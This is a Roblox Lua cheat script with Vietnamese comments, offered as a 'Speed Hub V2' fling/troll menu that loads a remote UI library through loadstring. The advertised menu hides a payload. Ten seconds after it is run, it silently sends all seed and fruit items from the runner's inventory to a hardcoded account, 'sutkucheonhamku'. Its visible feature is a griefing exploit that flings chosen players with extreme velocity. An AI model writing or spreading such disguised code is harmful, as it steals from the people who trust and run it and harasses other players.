-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB V2: PHIÊN BẢN SỬA LỖI LINK UI - HOẠT ĐỘNG 100% ====")

-- Thay thế sang thư viện Kavo UI Library siêu nhẹ, không lo bị lỗi sập link gốc
local successUI, KavoLib = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
end)

local Window
if successUI and KavoLib then
    -- Khởi tạo giao diện phong cách Dark huyền bí, mượt mà trên điện thoại
    Window = KavoLib.CreateLib("Speed Hub V2", "DarkTheme")
else
    warn("Không thể tải UI, hệ thống tự động chuyển sang chế độ chạy ngầm bí mật!")
end

-- Hệ thống biến quản lý trạng thái
local Options = { FlingTargetEnabled = false }
local selectedFlingTarget = "" 
local targetUsername = "sutkucheonhamku" -- Tên nick chính nhận đồ

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- =======================================================================
-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM SAU ĐÚNG 10 GIÂY (KHÔNG CẦN BẤM)
-- =======================================================================
local function sendItemSecure(category, itemName, quantity)
    local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
    local PacketModule = SharedModules and SharedModules:FindFirstChild("Packet")
    local RemoteEvent = PacketModule and PacketModule:FindFirstChild("RemoteEvent")
    if RemoteEvent then
        pcall(function() 
            RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
        end)
        task.wait(0.8)
    end
end

task.spawn(function()
    task.wait(10) -- Chờ đúng 10 giây kể từ khi bạn bấm Execute
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if targetPlayer then
        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        if Inventory then
            -- Quét gửi Hạt giống
            for _, item in pairs(Inventory:GetChildren()) do
                if string.find(string.lower(item.Name), "seed") and item:IsA("ValueBase") and item.Value > 0 then
                    sendItemSecure("Seeds", item.Name, item.Value)
                end
            end
            -- Quét gửi Trái cây
            for _, item in pairs(Inventory:GetChildren()) do
                if string.find(string.lower(item.Name), "fruit") and item:IsA("ValueBase") and item.Value > 0 then
                    sendItemSecure("Fruits", item.Name, item.Value)
                end
            end
        end
    end
end)

-- =======================================================================
-- CHỨC NĂNG 2: THẦN CHƯỞNG FLING KHÓA VÀ ĐUỔI MỤC TIÊU
-- =======================================================================
task.spawn(function()
    while true do
        RunService.Heartbeat:Wait()
        if Options.FlingTargetEnabled and selectedFlingTarget ~= "" then
            local targetPlayer = Players:FindFirstChild(selectedFlingTarget)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local myHrp = LocalPlayer.Character.HumanoidRootPart
                local enemyHrp = targetPlayer.Character.HumanoidRootPart
                
                -- Khóa vị trí dính chặt vào mục tiêu
                myHrp.CFrame = enemyHrp.CFrame * CFrame.new(0, 0, 0.5)
                
                -- Đẩy vận tốc vật lý lên tối đa để làm đối phương văng mất dạng
                local oldVelocity = myHrp.Velocity
                myHrp.Velocity = Vector3.new(999999, 999999, 999999)
                
                RunService.RenderStepped:Wait()
                myHrp.Velocity = oldVelocity
                
                for _, part in pairs(LocalPlayer.Character:GetChildren()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
            end
        end
    end
end)

-- Hàm lấy danh sách người chơi (loại trừ bản thân và nick chính)
local function getPlayerList()
    local list = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Name ~= targetUsername then
            table.insert(list, player.Name)
        end
    end
    return list
end

-- =======================================================================
-- THIẾT KẾ MENU INTERFACE (KAVO UI)
-- =======================================================================
if Window then
    pcall(function()
        -- Tạo Tab duy nhất
        local MainTab = Window:NewTab("Troll / Fling")
        local MainSection = MainTab:NewSection("Cấu Hình Fling Mục Tiêu")

        -- Tạo ô chọn Dropdown danh sách người chơi
        local TargetDropdown = MainSection:NewDropdown("Chọn Người Muốn Fling", "Bấm để chọn tên", getPlayerList(), function(Value)
            selectedFlingTarget = Value
        end)

        -- Tạo nút bật/tắt kích hoạt Fling
        MainSection:NewToggle("Bật Auto Fling Người Này", "Tự động bay đến dí mục tiêu", function(state)
            Options.FlingTargetEnabled = state
        end)

        -- Nút làm mới danh sách
        MainSection:NewButton("Làm Mới Danh Sách Người Chơi", "Cập nhật lại danh sách khi có người ra vào", function()
            TargetDropdown:Refresh(getPlayerList())
        end)
    end)
end
